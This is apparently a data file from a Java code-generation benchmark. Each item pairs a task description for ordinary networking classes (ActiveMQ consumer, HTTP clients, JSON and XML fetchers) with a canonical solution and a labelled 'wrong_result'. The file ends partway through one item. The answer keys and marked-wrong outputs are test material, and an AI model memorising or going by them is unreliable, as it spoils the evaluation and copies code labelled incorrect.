[
  {
    "Task_id": 1,
    "Instruction": "Task Description: Create a Java class that implements an ActiveMQ message consumer capable of receiving messages from a specified queue, processing different message types (TextMessage and BytesMessage), and handling connection exceptions.\n\nClass Description: The ActiveMqConsumer class implements Runnable and ExceptionListener interfaces to asynchronously consume messages from an ActiveMQ broker while handling connection exceptions. It manages the JMS connection lifecycle and provides methods to start/stop the consumer.\n\nAttributes:\n- connection: Connection - JMS connection to the ActiveMQ broker\n- session: Session - JMS session for message processing\n- consumer: MessageConsumer - JMS message consumer for receiving messages\n- remoteUri: String - URI of the ActiveMQ broker\n- queueName: String - Name of the queue to consume messages from\n\nMethods:\n- ActiveMqConsumer(String remoteUri, String queueName) -> None - Constructor that initializes the broker URI and queue name\n- start() -> void - Creates connection factory, establishes connection, creates session and consumer\n- stop() -> void - Closes consumer, session and connection resources\n- run() -> void - Continuously receives and processes messages (TextMessage/BytesMessage)\n- onException(JMSException e) -> void - Exception handler that stops the consumer on connection errors\n- getConnection() -> Connection - Returns the JMS connection\n- getSession() -> Session - Returns the JMS session\n- getConsumer() -> MessageConsumer - Returns the message consumer",
    "Canonical_solution": "import javax.jms.BytesMessage;\nimport javax.jms.Connection;\nimport javax.jms.Destination;\nimport javax.jms.ExceptionListener;\nimport javax.jms.JMSException;\nimport javax.jms.Message;\nimport javax.jms.MessageConsumer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnectionFactory;\nimport com.sitewhere.spi.SiteWhereException;\n\npublic class ActiveMqConsumer implements Runnable, ExceptionListener {\n\n    private Connection connection;\n    private Session session;\n    private MessageConsumer consumer;\n    private String remoteUri;\n    private String queueName;\n\n    public ActiveMqConsumer(String remoteUri, String queueName) {\n        this.remoteUri = remoteUri;\n        this.queueName = queueName;\n    }\n\n    public void start() throws SiteWhereException {\n        try {\n            ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(remoteUri);\n            this.connection = connectionFactory.createConnection();\n            this.connection.setExceptionListener(this);\n            this.connection.start();\n            this.session = this.connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            Destination destination = this.session.createQueue(queueName);\n            this.consumer = this.session.createConsumer(destination);\n        } catch (Exception e) {\n            throw new SiteWhereException(\"Error starting ActiveMQ consumer.\", e);\n        }\n    }\n\n    public void stop() throws SiteWhereException {\n        try {\n            this.consumer.close();\n            this.session.close();\n            this.connection.close();\n        } catch (Exception e) {\n            throw new SiteWhereException(\"Error shutting down ActiveMQ consumer.\", e);\n        }\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Message message = consumer.receive();\n                if (message == null) {\n                    break;\n                }\n                if (message instanceof TextMessage) {\n                    TextMessage textMessage = (TextMessage) message;\n                    byte[] payload = textMessage.getText().getBytes();\n                    // Process payload here\n                } else if (message instanceof BytesMessage) {\n                    BytesMessage bytesMessage = (BytesMessage) message;\n                    byte[] buffer = new byte[(int) bytesMessage.getBodyLength()];\n                    // Process buffer here\n                }\n            } catch (Throwable e) {\n                return;\n            }\n        }\n    }\n\n    @Override\n    public void onException(JMSException e) {\n        try {\n            stop();\n        } catch (SiteWhereException e1) {\n        }\n    }\n\n    protected Connection getConnection() {\n        return connection;\n    }\n\n    protected Session getSession() {\n        return session;\n    }\n\n    protected MessageConsumer getConsumer() {\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 39,
    "wrong_result": "```java\nimport javax.jms.*;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class ActiveMqConsumer implements Runnable, ExceptionListener {\n    private Connection connection;\n    private Session session;\n    private MessageConsumer consumer;\n    private String remoteUri;\n    private String queueName;\n\n    public ActiveMqConsumer(String remoteUri, String queueName) {\n        this.remoteUri = remoteUri;\n        this.queueName = queueName;\n    }\n\n    public void start() {\n        try {\n            ConnectionFactory factory = new ActiveMQConnectionFactory(remoteUri);\n            connection = factory.createConnection();\n            connection.setExceptionListener(this);\n            session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            Destination destination = session.createQueue(queueName);\n            consumer = session.createConsumer(destination);\n            connection.start();\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (consumer != null) consumer.close();\n            if (session != null) session.close();\n            if (connection != null) connection.close();\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        try {\n            while (true) {\n                Message message = consumer.receive(1000);\n                if (message == null) continue;\n                if (message instanceof TextMessage) {\n                    TextMessage textMessage = (TextMessage) message;\n                    System.out.println(\"Received TextMessage: \" + textMessage.getText());\n                } else if (message instanceof BytesMessage) {\n                    BytesMessage bytesMessage = (BytesMessage) message;\n                    byte[] bytes = new byte[(int) bytesMessage.getBodyLength()];\n                    bytesMessage.readBytes(bytes);\n                    System.out.println(\"Received BytesMessage: \" + new String(bytes));\n                }\n            }\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void onException(JMSException e) {\n        System.err.println(\"Connection exception: \" + e.getMessage());\n        stop();\n    }\n\n    public Connection getConnection() {\n        return connection;\n    }\n\n    public Session getSession() {\n        return session;\n    }\n\n    public MessageConsumer getConsumer() {\n        return consumer;\n    }\n}\n```"
  },
  {
    "Task_id": 101,
    "Instruction": "Task Description: Create a Java HTTP client class that handles various types of HTTP requests, including multipart form data uploads, with support for proxy configuration and connection retries.\n\nClass Description: The HttpClient class provides functionality to make HTTP requests with configurable methods, headers, and request bodies. It supports both simple requests and multipart form data uploads, handles connection retries through a retry handler, and allows proxy configuration.\n\nAttributes:\n- url: String - The target URL for HTTP requests\n- con: HttpURLConnection - The HTTP connection object\n- os: OutputStream - Output stream for writing request data\n- delimiter: String - Boundary delimiter for multipart requests (default \"--\")\n- boundary: String - Unique boundary string for multipart requests\n- handler: HttpConnectionRetryHandler - Handler for connection retry logic\n- proxyHost: String - Proxy host address\n- proxyPort: String - Proxy port number\n- me: HttpClient - Singleton instance reference\n\nMethods:\n- getInstance() -> HttpClient - Returns the singleton instance of HttpClient\n- connect(String method, Properties props) -> void - Establishes HTTP connection with given method and properties (throws HttpClientException)\n- doConnection(String method, Properties props) -> void - Internal method to create and configure HTTP connection (throws IOException)\n- downloadImage(String imgName) -> byte[] - Downloads an image by name and returns as byte array\n- connectForMultipart() -> void - Prepares connection for multipart form data upload (throws Exception)\n- addFormPart(String paramName, String value) -> void - Adds a form part to multipart request (throws Exception)\n- addFilePart(String paramName, String fileName, byte[] data) -> void - Adds a file part to multipart request (throws Exception)\n- finishMultipart() -> void - Finalizes multipart request (throws Exception)\n- getResponse() -> String - Reads and returns server response (throws Exception)\n- writeParamData(String paramName, String value) -> void - Internal method to write form parameter data (throws Exception)\n- setUrl(String url) -> void - Sets the target URL\n- setProxy(String host, String port) -> void - Configures proxy settings",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Enumeration;\nimport java.util.Properties;\n\npublic class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    \n    private String delimiter = \"--\";\n    private String boundary =  \"SwA\"+Long.toString(System.currentTimeMillis())+\"SwA\";\n    \n    private HttpConnectionRetryHandler handler;\n    \n    private String proxyHost;\n    private String proxyPort;\n    \n    private static HttpClient me;\n    \n    public static HttpClient getInstance() {\n        if (me == null)\n            me = new HttpClient();\n        \n        return me;\n    }\n\n    private HttpClient() { }\n\n    public void connect(String method, Properties props) throws HttpClientException {\n        boolean status  = true;\n        int attemptNumber = 0;\n        while (status) {\n            try {\n                attemptNumber++;\n                doConnection(method, props);\n                status = false;\n            }\n            catch(Throwable t) {\n                if (handler != null) {\n                    status = handler.shouldRetry(t, attemptNumber);\n                    if (!status)\n                        throw new HttpClientException(t);\n                }\n                else {                    \n                    throw new HttpClientException(t);\n                }\n            }\n        }\n    }\n    \n    private void doConnection(String method, Properties props) throws IOException {\n        if (proxyPort != null && proxyHost != null) {\n            Proxy p = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, Integer.parseInt(proxyPort)));\n            con = (HttpURLConnection) ( new URL(url)).openConnection(p);\n        }\n        else\n            con = (HttpURLConnection) ( new URL(url)).openConnection();\n        \n        con.setRequestMethod(method);\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setConnectTimeout(5 * 1000);\n        \n        if (props != null) {\n            Enumeration keys = props.keys();\n            while (keys.hasMoreElements()) {\n                String key = (String) keys.nextElement();\n                String val = props.getProperty(key);\n                con.setRequestProperty(key, val);\n            }\n        }\n        \n        con.connect();\n    }\n\n    public byte[] downloadImage(String imgName) {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            connect(\"Post\", null);\n            con.getOutputStream().write((\"name=\" + imgName).getBytes());\n            \n            InputStream is = con.getInputStream();\n            byte[] b = new byte[1024];\n            \n            while (is.read(b) != -1)\n                baos.write(b);\n            \n            con.disconnect();\n        }\n        catch(Throwable t) {\n            t.printStackTrace();\n        }\n        \n        return baos.toByteArray();\n    }\n\n    public void connectForMultipart() throws Exception {\n        Properties props = new Properties();\n        props.setProperty(\"Connection\", \"Keep-Alive\");\n        props.setProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n\n        connect(\"POST\", props);\n        os = con.getOutputStream();\n    }\n\n    public void addFormPart(String paramName, String value) throws Exception {\n        writeParamData(paramName, value);\n    }\n\n    public void addFilePart(String paramName, String fileName, byte[] data) throws Exception {\n        os.write((delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\").getBytes());\n        os.write((\"Content-Type: application/octet-stream\\r\\n\").getBytes());\n        os.write((\"Content-Transfer-Encoding: binary\\r\\n\").getBytes());\n        os.write(\"\\r\\n\".getBytes());\n   \n        os.write(data);\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void finishMultipart() throws Exception {\n        os.write((delimiter + boundary + delimiter + \"\\r\\n\").getBytes());\n    }\n\n    public String getResponse() throws Exception {\n        InputStream is = con.getInputStream();\n        byte[] b1 = new byte[1024];\n        StringBuffer buffer = new StringBuffer();\n        \n        while (is.read(b1) != -1)\n            buffer.append(new String(b1));\n        \n        con.disconnect();\n        \n        return buffer.toString();\n    }\n\n    private void writeParamData(String paramName, String value) throws Exception {\n        os.write((delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write(\"Content-Type: text/plain\\r\\n\".getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\").getBytes());\n        os.write((\"\\r\\n\" + value + \"\\r\\n\").getBytes());\n    }\n\n    public void setUrl(String url) {\n        this.url = url;\n    }\n    \n    public void setProxy(String host, String port) {\n        this.proxyHost = host;\n        this.proxyPort = port;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.Properties;\n\npublic class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    private String delimiter = \"--\";\n    private String boundary;\n    private HttpConnectionRetryHandler handler;\n    private String proxyHost;\n    private String proxyPort;\n    private static HttpClient me;\n\n    private HttpClient() {\n        boundary = \"===\" + System.currentTimeMillis() + \"===\";\n    }\n\n    public static synchronized HttpClient getInstance() {\n        if (me == null) {\n            me = new HttpClient();\n        }\n        return me;\n    }\n\n    public void connect(String method, Properties props) throws HttpClientException {\n        try {\n            doConnection(method, props);\n        } catch (IOException e) {\n            throw new HttpClientException(\"Connection failed: \" + e.getMessage());\n        }\n    }\n\n    private void doConnection(String method, Properties props) throws IOException {\n        URL urlObj = new URL(url);\n        if (proxyHost != null && proxyPort != null) {\n            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, Integer.parseInt(proxyPort)));\n            con = (HttpURLConnection) urlObj.openConnection(proxy);\n        } else {\n            con = (HttpURLConnection) urlObj.openConnection();\n        }\n        con.setRequestMethod(method);\n        con.setDoOutput(true);\n        con.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        if (props != null) {\n            for (String key : props.stringPropertyNames()) {\n                con.setRequestProperty(key, props.getProperty(key));\n            }\n        }\n        os = con.getOutputStream();\n    }\n\n    public byte[] downloadImage(String imgName) throws Exception {\n        try {\n            connect(\"GET\", null);\n            int responseCode = con.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                InputStream is = con.getInputStream();\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[4096];\n                int bytesRead;\n                while ((bytesRead = is.read(buffer)) != -1) {\n                    baos.write(buffer, 0, bytesRead);\n                }\n                return baos.toByteArray();\n            } else {\n                throw new Exception(\"Failed to download image. Response code: \" + responseCode);\n            }\n        } catch (IOException e) {\n            throw new Exception(\"Download error: \" + e.getMessage());\n        }\n    }\n\n    public void connectForMultipart() throws Exception {\n        if (con == null || os == null) {\n            doConnection(\"POST\", null);\n        }\n        con.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n    }\n\n    public void addFormPart(String paramName, String value) throws Exception {\n        writeParamData(paramName, value);\n    }\n\n    public void addFilePart(String paramName, String fileName, byte[] data) throws Exception {\n        os.write((\"\\r\\n--\" + boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\").getBytes());\n        os.write(\"Content-Type: application/octet-stream\\r\\n\\r\\n\".getBytes());\n        os.write(data);\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void finishMultipart() throws Exception {\n        os.write((\"\\r\\n--\" + boundary + \"--\\r\\n\").getBytes());\n        os.flush();\n        os.close();\n    }\n\n    public String getResponse() throws Exception {\n        try {\n            int responseCode = con.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                return response.toString();\n            } else {\n                BufferedReader errorStream = new BufferedReader(new InputStreamReader(con.getErrorStream()));\n                String errorLine;\n                StringBuilder errorResponse = new StringBuilder();\n                while ((errorLine = errorStream.readLine()) != null) {\n                    errorResponse.append(errorLine);\n                }\n                errorStream.close();\n                throw new Exception(\"Server returned error code: \" + responseCode + \". Response: \" + errorResponse.toString());\n            }\n        } catch (IOException e) {\n            throw new Exception(\"Error reading response: \" + e.getMessage());\n        }\n    }\n\n    private void writeParamData(String paramName, String value) throws Exception {\n        os.write((\"\\r\\n--\" + boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\\r\\n\").getBytes());\n        os.write(value.getBytes());\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void setUrl(String url) {\n        this.url = url;\n    }\n\n    public void setProxy(String host, String port) {\n        this.proxyHost = host;\n        this.proxyPort = port;\n    }\n\n    public void setRetryHandler(HttpConnectionRetryHandler handler) {\n        this.handler = handler;\n    }\n\n    public interface HttpConnectionRetryHandler {\n        boolean shouldRetry(int retryCount, int responseCode, String errorMessage);\n    }\n\n    public static class HttpClientException extends Exception {\n        public HttpClientException(String message) {\n            super(message);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 103,
    "Instruction": "Task Description: Create a Java class that asynchronously fetches weather data from a remote API using HTTP URL connection and processes the JSON response to extract sunrise and sunset times.\n\nClass Description: HttpWeatherClient is an Android utility class that performs asynchronous HTTP requests to fetch weather data and parse the JSON response. It uses AsyncTask to handle network operations off the main thread.\n\nAttributes: None (All variables are local to methods)\n\nMethods:\n1: WeatherAsyncTask(String... params) -> String - AsyncTask subclass that handles the background HTTP request. Takes URL string as input and returns null (results are processed via progress updates).\n2: onProgressUpdate(String... progress) -> void - Processes the JSON response to extract sunrise and sunset times from the astronomy data.\n3: convertStreamToString(InputStream inputStream) -> String - Helper method that converts an InputStream to a String for JSON parsing. Takes InputStream as input and returns the converted String.\n\nNote: All methods include basic exception handling with empty catch blocks as shown in the reference code. The class is designed for Android platform (uses android.os.AsyncTask).",
    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpWeatherClient {\n\n    public static class WeatherAsyncTask extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String weatherData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    weatherData = convertStreamToString(in);\n                    publishProgress(weatherData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n                JSONObject query = json.getJSONObject(\"query\");\n                JSONObject results = query.getJSONObject(\"results\");\n                JSONObject channel = results.getJSONObject(\"channel\");\n                JSONObject astronomy = channel.getJSONObject(\"astronomy\");\n                String sunset = astronomy.getString(\"sunset\");\n                String sunrise = astronomy.getString(\"sunrise\");\n            } catch (Exception ex) {}\n        }\n    }\n\n    private static String convertStreamToString(InputStream inputStream) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String result = \"\";\n\n        try {\n            while ((line = reader.readLine()) != null) {\n                result += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return result;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport android.os.AsyncTask;\nimport org.json.JSONObject;\nimport java.io.InputStream;\nimport java.net.URL;\n\npublic class HttpWeatherClient {\n    private class WeatherAsyncTask extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                URL url = new URL(params[0]);\n                InputStream inputStream = url.openStream();\n                String response = convertStreamToString(inputStream);\n                publishProgress(response);\n            } catch (Exception e) {\n            }\n            return null;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject jsonObject = new JSONObject(progress[0]);\n                JSONObject astronomy = jsonObject.getJSONObject(\"astronomy\");\n                String sunrise = astronomy.getString(\"sunrise\");\n                String sunset = astronomy.getString(\"sunset\");\n            } catch (Exception e) {\n            }\n        }\n\n        private String convertStreamToString(InputStream inputStream) {\n            java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter(\"\\\\A\");\n            return scanner.hasNext() ? scanner.next() : \"\";\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 104,
    "Instruction": "Task Description: Create a function that performs an HTTP/HTTPS request with XML data and parses the XML response into a key-value map.\n\nFunction Description: This function sends an HTTP/HTTPS request (GET/POST) to a specified URL with XML data as input, then parses the XML response into a Map<String, Object> where keys are XML element names and values are their text content. The function handles connection setup, request configuration, data transmission, response parsing, and resource cleanup.\n\nInput:\n- requestUrl: String - The target URL for the HTTP request\n- requestMethod: String - The HTTP method to use (e.g., \"GET\" or \"POST\")\n- xmlStr: String - The XML data to send with the request (can be null for GET requests)\n\nOutput:\n- Map<String, Object> - A map containing key-value pairs parsed from the XML response, where keys are XML element names and values are their text content",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.HashMap;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic static Map<String, Object> httpXmlRequest(String requestUrl, String requestMethod, String xmlStr) {\n    Map<String, Object> map = new HashMap<String, Object>();\n    try {\n        HttpsURLConnection urlCon = (HttpsURLConnection) (new URL(requestUrl)).openConnection();\n        urlCon.setDoInput(true);\n        urlCon.setDoOutput(true);\n        urlCon.setRequestMethod(requestMethod);\n\n        if (\"GET\".equalsIgnoreCase(requestMethod)) {\n            urlCon.connect();\n        }\n\n        urlCon.setRequestProperty(\"Content-Length\", String.valueOf(xmlStr.getBytes().length));\n        urlCon.setUseCaches(false);\n        if (null != xmlStr) {\n            OutputStream outputStream = urlCon.getOutputStream();\n            outputStream.write(xmlStr.getBytes(\"UTF-8\"));\n            outputStream.flush();\n            outputStream.close();\n        }\n        InputStream inputStream = urlCon.getInputStream();\n        InputStreamReader inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        SAXReader reader = new SAXReader();\n        Document document = reader.read(inputStreamReader);\n        Element root = document.getRootElement();\n        List<Element> elementList = root.elements();\n        for (Element e : elementList) {\n            map.put(e.getName(), e.getText());\n        }\n        inputStreamReader.close();\n        inputStream.close();\n        inputStream = null;\n        urlCon.disconnect();\n    } catch (MalformedURLException e) {\n        LOG.error(e.getMessage());\n    } catch (IOException e) {\n        LOG.error(e.getMessage());\n    } catch (Exception e) {\n        LOG.error(e.getMessage());\n    }\n    return map;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "{\n  \"function\": \"public static Map<String, Object> sendHttpRequestAndParseXml(String requestUrl, String requestMethod, String xmlStr) {\\n    Map<String, Object> result = new HashMap<>();\\n    try {\\n        URL url = new URL(requestUrl);\\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\\n        connection.setRequestMethod(requestMethod);\\n        connection.setDoOutput(true);\\n        connection.setRequestProperty(\\\"Content-Type\\\", \\\"application/xml; charset=UTF-8\\\");\\n        if (xmlStr != null) {\\n            try (OutputStream os = connection.getOutputStream()) {\\n                byte[] input = xmlStr.getBytes(StandardCharsets.UTF_8);\\n                os.write(input, 0, input.length);\\n            }\\n        }\\n        int responseCode = connection.getResponseCode();\\n        if (responseCode == HttpURLConnection.HTTP_OK) {\\n            try (InputStream is = connection.getInputStream()) {\\n                DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\\n                DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\\n                Document doc = dBuilder.parse(is);\\n                doc.getDocumentElement().normalize();\\n                NodeList nodeList = doc.getElementsByTagName(\\\"*\\\");\\n                for (int i = 0; i < nodeList.getLength(); i++) {\\n                    Node node = nodeList.item(i);\\n                    if (node.getNodeType() == Node.ELEMENT_NODE) {\\n                        Element element = (Element) node;\\n                        String key = element.getTagName();\\n                        String value = element.getTextContent();\\n                        result.put(key, value);\\n                    }\\n                }\\n            }\\n        } else {\\n            System.err.println(\\\"HTTP request failed with code: \\\" + responseCode);\\n        }\\n    } catch (Exception e) {\\n        e.printStackTrace();\\n    }\\n    return result;\\n}\"\n}"
  },
  {
    "Task_id": 105,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using HttpURLConnection for making HTTP requests and handling responses.\n\nClass Description: The Http class provides a static method for sending HTTP requests to a specified URL with configurable request methods and payloads. It handles connection setup, request sending, response reading, and resource cleanup.\n\nMethods:\n\nMethod1: httpsRequest(String requestUrl, String requestMethod, String outputStr) -> String - Sends an HTTP request to the specified URL using the given method and optional request body, then returns the response as a string.\n  - requestUrl: String - The target URL for the HTTP request\n  - requestMethod: String - The HTTP method to use (e.g., \"GET\", \"POST\")\n  - outputStr: String - The request body to send (can be null for requests without body)\n  - Returns: String - The response body from the server, or null if an error occurs\n\nThe method handles:\n1. Creating and configuring HttpURLConnection\n2. Setting request headers (content-type: text/xml; charset=UTF-8)\n3. Sending request body if provided\n4. Reading and concatenating response\n5. Proper resource cleanup\n6. Error handling and logging",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport com.scudata.common.Logger;\n\npublic class Http {\n    public static String httpsRequest(String requestUrl, String requestMethod, String outputStr) {    \n        try {    \n            URL url = new URL(requestUrl);    \n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();    \n              \n            conn.setDoOutput(true);    \n            conn.setDoInput(true);    \n            conn.setUseCaches(false);    \n            conn.setRequestMethod(requestMethod);    \n            conn.setRequestProperty(\"content-type\", \"text/xml; charset=UTF-8\");\n            \n            if (null != outputStr) {    \n                OutputStream outputStream = conn.getOutputStream();    \n                outputStream.write(outputStr.getBytes(\"UTF-8\"));    \n                outputStream.close();    \n            }    \n            \n            InputStream inputStream = conn.getInputStream();    \n            InputStreamReader inputStreamReader = new InputStreamReader(inputStream, \"utf-8\");    \n            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);    \n            String str = null;  \n            StringBuffer buffer = new StringBuffer();    \n            while ((str = bufferedReader.readLine()) != null) {    \n                buffer.append(str);    \n            }    \n            \n            bufferedReader.close();    \n            inputStreamReader.close();    \n            inputStream.close();    \n            inputStream = null;    \n            conn.disconnect();    \n            return buffer.toString();    \n        } catch (Exception e) {    \n            System.out.println(\"http exception{}\"+ e);\n            Logger.error(e.getMessage());\n        }    \n        return null;    \n    }    \n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class Http {\n    public static String httpsRequest(String requestUrl, String requestMethod, String outputStr) {\n        try {\n            URL url = new URL(requestUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(requestMethod);\n            connection.setRequestProperty(\"Content-Type\", \"text/xml; charset=UTF-8\");\n            connection.setDoOutput(true);\n            if (outputStr != null) {\n                try (OutputStream os = connection.getOutputStream()) {\n                    byte[] input = outputStr.getBytes(\"UTF-8\");\n                    os.write(input, 0, input.length);\n                }\n            }\n            int responseCode = connection.getResponseCode();\n            StringBuilder response = new StringBuilder();\n            try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"))) {\n                String line;\n                while ((line = br.readLine()) != null) {\n                    response.append(line);\n                }\n            }\n            return response.toString();\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 106,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously to fetch and process JSON data from a given URL.\n\nClass Description: HttpRequestHandler is a utility class that contains nested classes and methods for performing asynchronous HTTP requests and processing JSON responses. The main functionality is implemented through an AsyncTask subclass to avoid blocking the main thread during network operations.\n\nAttributes: \n(None - This is a utility class with no instance attributes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - A nested AsyncTask class that performs HTTP GET requests in the background. It takes a URL as input, establishes a connection, retrieves data, and processes the response.\n\nMethod2: onProgressUpdate(String... progress) -> void - A callback method that processes the received JSON data during the task's execution. It parses the JSON array and extracts individual JSON objects.\n\nMethod3: onPostExecute(String result2) -> void - A callback method that handles post-execution tasks after the background operation completes.\n\nMethod4: ConvertInputToStringNoChange(InputStream inputStream) -> String - A helper method that converts an InputStream into a String by reading all lines from the input stream and concatenating them.",
    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONArray;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONArray json = new JSONArray(progress[0]);\n                for (int i = 0; i < json.length(); i++) {\n                    JSONObject user = json.getJSONObject(i);\n                    // Handle the parsed JSON data here\n                }\n            } catch (Exception ex) {}\n        }\n\n        protected void onPostExecute(String result2) {\n            // Handle post-execution tasks here\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while ((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
